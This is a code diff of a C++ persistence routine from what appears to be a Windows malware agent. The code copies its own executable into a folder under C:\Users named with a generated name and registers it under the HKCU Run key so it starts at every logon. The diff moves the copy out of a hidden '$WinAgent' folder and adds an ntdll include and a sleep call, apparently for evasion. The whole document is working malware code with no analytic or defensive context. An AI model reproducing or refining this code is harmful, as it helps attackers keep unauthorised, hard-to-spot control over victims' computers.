@@ -1,4 +1,5 @@
 #include "persist.h"
+#include "ntdll.h"
 
 void copyExe(const std::string& generatedName);
 void regStartupKey(const std::string& generatedName);
@@ -18,6 +19,7 @@ void persist()
         if (stat(path.c_str(), &buffer) != 0)
         {
             copyExe(persistence);
+            sleep2();
             regStartupKey(persistence);
         }
     }
@@ -25,21 +27,21 @@ void persist()
 
 void copyExe(const std::string& generatedName)
 {
-    LPCWSTR newfolder = L"C:\\$WinAgent";
+    std::wstring folderName(generatedName.begin(), generatedName.end());
+    std::wstring newfolder = std::wstring() + L"C:\\Users\\" + folderName;
     char filename[MAX_PATH];
-    std::string newLocation = std::string() + "C:\\$WinAgent\\" + generatedName + ".exe";
-    CreateDirectory(newfolder, NULL);
-    SetFileAttributes(newfolder, FILE_ATTRIBUTE_HIDDEN);
-    BOOL stats = 0;
+    std::string newLocation = std::string() + "C:\\Users\\" + generatedName + "\\" + generatedName + ".exe";
+    CreateDirectory(newfolder.c_str(), NULL);
+    //SetFileAttributes(newfolder.c_str(), FILE_ATTRIBUTE_HIDDEN);
     GetModuleFileNameA(NULL, filename, MAX_PATH);
-    CopyFileA(filename, newLocation.c_str(), stats);
+    CopyFileA(filename, newLocation.c_str(), FALSE);
 }
 
 void regStartupKey(const std::string& generatedName)
 {
-    std::wstring wRegName(generatedName.begin(), generatedName.end());
-    std::wstring progPath = std::wstring() + L"C:\\$WinAgent\\" + wRegName + L".exe";
     HKEY hkey = NULL;
+    std::wstring wRegName(generatedName.begin(), generatedName.end());
+    std::wstring progPath = std::wstring() + L"C:\\Users\\" + wRegName + L"\\" + wRegName + L".exe";
     RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
     RegSetValueEx(hkey, wRegName.c_str(), 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
     RegCloseKey(hkey);
